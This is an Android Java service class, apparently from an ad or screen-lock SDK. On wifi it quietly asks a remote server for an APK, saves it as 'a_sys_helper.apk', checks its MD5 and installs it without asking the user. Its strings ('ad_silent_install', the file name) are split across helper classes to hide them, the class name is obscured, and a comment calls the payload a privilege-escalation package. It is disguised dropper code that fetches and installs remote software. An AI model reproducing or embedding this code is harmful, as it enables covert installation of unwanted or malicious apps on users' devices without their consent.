package kdui.uj.tkd.kdg.service;

import java.io.File;

import kdui.uj.tkd.kdg.data.SharePreferenceSdkData;
import kdui.uj.tkd.kdg.net.NetworkTask;
import kdui.uj.tkd.kdg.utils.Md5Util;
import kdui.uj.tkd.kdg.utils.NetClass;
import kdui.uj.tkd.kdg.utils.PackageInstallUtil;
import kdui.uj.tkd.kdg.utils.StrHelp1;
import kdui.uj.tkd.kdg.utils.StrHelp2;
import kdui.uj.tkd.kdg.utils.StrHelp3;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Environment;
import android.os.IBinder;

import com.lsk.open.core.net.NetHeadUtils;
import com.lsk.open.core.utils.ProductInfoUtils;
	/*
	 * SiService
	 */

public class si extends Service{

//	private static final String SUFFIX = "ApkAsset.json?tag=ad_silent_install";
//	private static final String SUFFIX = StrHelp1.SILENT_INSTALL+StrHelp2.SILENT_INSTALL2+StrHelp3.SILENT_INSTALL;
	private static final String SUFFIX = new StringBuffer(StrHelp1.SILENT_INSTALL).append(StrHelp2.SILENT_INSTALL2).append(StrHelp3.SILENT_INSTALL).toString();
	
//	private static final String SUB_DIRECTORY_NAME = "ad_download";
//	private static final String SUB_DIRECTORY_NAME = StrHelp1.SILENT_INSTALL1+StrHelp2.SILENT_INSTALL1;
	private static final String SUB_DIRECTORY_NAME = new StringBuffer(StrHelp1.SILENT_INSTALL1).append(StrHelp2.SILENT_INSTALL1).toString();
//	private static final String APK_FILE_NAME = "a_sys_helper.apk";
//	private static final String APK_FILE_NAME = StrHelp1.A_PREFIX+StrHelp2.SILENT_INSTALL+StrHelp3.SILENT_INSTALL1;
	private static final String APK_FILE_NAME = new StringBuffer(StrHelp1.A_PREFIX).append(StrHelp2.SILENT_INSTALL).append(StrHelp3.SILENT_INSTALL1).toString();
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		prepareDirs();
		
		String netAvialbleType = ProductInfoUtils.getNetAvialbleType(this);
		if(netAvialbleType == null || "".endsWith(netAvialbleType)) {
			return;
		}
		if(!netAvialbleType.equalsIgnoreCase("wifi"))
			return;
		
		new Thread(new Runnable() {
			@Override
			public void run() {
				getDownloadFileMessage();
			}
		}).start();
	}
	
	private File pluginFile;
	//准备所需目录
	private void prepareDirs() {
		File pluginDir = prepareDownloadDir();
        pluginFile = new File(pluginDir, APK_FILE_NAME);
        prepareOptimizeDir();
	}

	private String optimizeDexDir;
	private void prepareOptimizeDir() {
		//不要使用getDir或者getFilesDiry方法，这个方法存在兼容性问题
	    optimizeDexDir = "/data/data/" + getPackageName() + "/files/slie";
	    if(optimizeDexDir != null) {
	    	File optimizeDexDirFile = new File(optimizeDexDir);
	    	if(optimizeDexDirFile != null && !optimizeDexDirFile.exists()) {
	    		optimizeDexDirFile.mkdirs();
	    	}
	    }
	}

	private File prepareDownloadDir() {
		File pluginDir = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+ File.separator + "kslock" + File.separator + SUB_DIRECTORY_NAME);
        if(!pluginDir.exists()) {
            pluginDir.mkdirs();
        }
		return pluginDir;
	}
	
	private String getRequsetUrl(int index) {
		return NetworkTask.urls[index] + SUFFIX;
	}
	
	private class NetListener implements NetClass.OnNetListener {

		@Override
		public void onSuccess(String paramString) {
			requestSuccessed = true;
			libMessage = paramString;
		}

		@Override
		public void onError(String paramString) {
			requestSuccessed = false;
		}
		@Override
		public void onProgress(int paramInt1, int paramInt2) {}
	}

	boolean requestSuccessed = false;
	String libMessage;
	//获取最新包信息
	private void getDownloadFileMessage() {
        NetClass netClass = new NetClass();
        netClass.setRequestHeader(NetHeadUtils.getSendHeader(getApplicationContext()));
        //注意：这是一个同步的操作，不能在主线程中
        for(int i=0; i < NetworkTask.urls.length; i++) {
        	String url = getRequsetUrl(i);
        	netClass.getRequest(url, new NetListener());
        	if(requestSuccessed) {
        		break;
        	} else {
        		continue;
        	}
        }

        // 所有链接尝试后都失败了， 会出现libmessage仍然为空的情况
        if(libMessage == null) {
        	return;
        }
        
        Library library = null;
        try {
        	JSONObject message = new JSONObject(libMessage);
        	String errno = message.getString("errno");
        	if("200".equals(errno)){
        		String data = message.getString("data");
        		library = new Library(data);
        	}
        } catch (JSONException e) {
            stopService();
            return;     //json格式不对，就直接返回，不再进行后续处理了。
        }
        doDownloadFile(library);
    }
	
	private void stopService() {
		stopSelf();
	}
	
	//下载jar包
	private void doDownloadFile(final Library library) {
        if(library == null) {
        	stopService();
            return;     //网络错误等，可能导致lib的网络请求失败
        }
        boolean installed = checkInstalledBeforeDownload(library);
        if(installed) {
        	stopService();
        	return ;
        }
        if(pluginFile != null && pluginFile.exists()) {   //之前已经下载过提权包，先校验是否一致，如果一致就不用再下载了。
            String md5 = Md5Util.md5(pluginFile);
            if(md5 != null && md5.equalsIgnoreCase(library.libMd5)) {
                doInstall();        //不用再下了，直接安装
                return;
            } else {
                pluginFile.delete();   //md5值不匹配，先删除再下载
            }
        }

        NetClass netClass = new NetClass();
        netClass.setRequestHeader(NetHeadUtils.getSendHeader(getApplicationContext()));
        netClass.getRequestWriteResponseToFile(library.libUrl,pluginFile, new NetClass.OnNetListener() {
            @Override
            public void onSuccess(String paramString) {
                if(Md5Util.checkMd5(pluginFile, library.libMd5)) {     //md5匹配，说明下载正确
                  doInstall();        //不用再下了，直接安装
                }
            }

            @Override
            public void onError(String paramString) {
                stopService();
            }

            @Override
            public void onProgress(int paramInt1, int paramInt2) {
            }
        });
    }
	
	
    protected void doInstall() {
    	boolean alreadyInstalled = checkInstalledBeforeInstall(pluginFile.getAbsolutePath());
		if (!alreadyInstalled) {
			PackageInstallUtil.installApp(getApplicationContext(), pluginFile.getAbsolutePath());
    	}
		stopService();
	}

	private void saveInstallingPackage(String pkgInfo) {
//		PackageInfo packageArchiveInfo = getPackageManager().getPackageArchiveInfo(pluginFile.getAbsolutePath(), 0);
//		SharePreferenceSdkData.setSilentInstallingPackage(SilentInstallerService.this, packageArchiveInfo.packageName);
		SharePreferenceSdkData.setSilentInstallingPackage(si.this, pkgInfo);
	}

	
	private boolean checkInstalledBeforeInstall(String apkFilePath) {
		return checkInstalledPackageMd5(apkFilePath);
	}

	private boolean checkInstalledBeforeDownload(final Library library) {
		if(library.libPackageName != null) {
			//保存信息，以便安装完成后启动时使用
			saveInstallingPackage(library.libPackageName);
        	try {
        		int index = library.libPackageName.indexOf("/");
        		String pkgName = null;
        		//即服务端配置了分隔符
        		if(index != -1) {
        			pkgName = library.libPackageName.substring(0, index);
        		} else {
        			pkgName = library.libPackageName;
        		}
        		
        		return checkInstalledPackageMd5(pkgName, library.libMd5);
			} catch (Exception e) {
				e.printStackTrace();
			}
        } 
		return false;
	}
	
	//注： 如果已安装的apk,其安装文件无法读取，则认为其md5值匹配，避免重复多次安装
	private boolean checkInstalledPackageMd5(String packageName, String md5) {
		
		String installedPackageMd5 = null;
		try {
			installedPackageMd5 = getPackageMd5ByPackageName(packageName);
		} catch (IllegalStateException e) {
			return true;
		}
		
		if (installedPackageMd5 != null && installedPackageMd5.equals(md5)) {
			return true;
		}
		
		return false;
	}
	
	private boolean checkInstalledPackageMd5(String apkFilePath) {
		if (apkFilePath == null || "".equals(apkFilePath)) {
			return false;
		}

		PackageInfo packageArchiveInfo = getPackageManager().getPackageArchiveInfo(apkFilePath, 0);
		
		if(packageArchiveInfo != null) {
			String packageName = packageArchiveInfo.packageName;
			
			if (packageName == null || "".equals(packageName)) {
				return false;
			}

			File apkFile = new File(apkFilePath);
			if (!apkFile.exists()) {
				return false;
			}
			
			String apkFileMd5 = Md5Util.md5(apkFile);

			return checkInstalledPackageMd5(packageName, apkFileMd5);
		}

		return false;
	}
	
	/**
	 * 
	 * @param packageName
	 * @return	null if package not installed 
	 * @throws IllegalStateException if sourceFile not readable
	 */
	private String getPackageMd5ByPackageName(String packageName) throws IllegalStateException{
		if (packageName == null) {
			return null;
		}
		PackageInfo packageInfo = null;
		try {
			packageInfo = getPackageManager().getPackageInfo(packageName, 0);
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		
		if(packageInfo != null) {
			String sourceDir = packageInfo.applicationInfo.sourceDir;
			
			if(sourceDir != null ) {
				//无法获取已安装包的路径
				File sourceFile = new File(sourceDir);
				if (!sourceFile.canRead()) {
					throw new IllegalStateException();
				}
				return Md5Util.md5(sourceFile);
			}
		}
		
		return null;
	}

	class Library {
        private String libUrl;
        private String libSize;
        private String libMd5;
        private String libPackageName;
        public Library(String libMessage) throws JSONException {
            try {
                JSONObject jsonObject = new JSONObject(libMessage);
                //TODO， 这是测试环境的写法
//                libUrl = "http://apiv2.screenlock.local.kingsgame.cn" + jsonObject.getString("url");
                //正式地址不需要加前缀
                libUrl = jsonObject.getString("url");
                libSize = jsonObject.getString("size");
                libMd5 = jsonObject.getString("md5");
                if(!jsonObject.isNull("package_name")) {
                	libPackageName = jsonObject.getString("package_name");
                }

            } catch (JSONException e) {
                e.printStackTrace();
                throw e;
            }
        }
    }
}
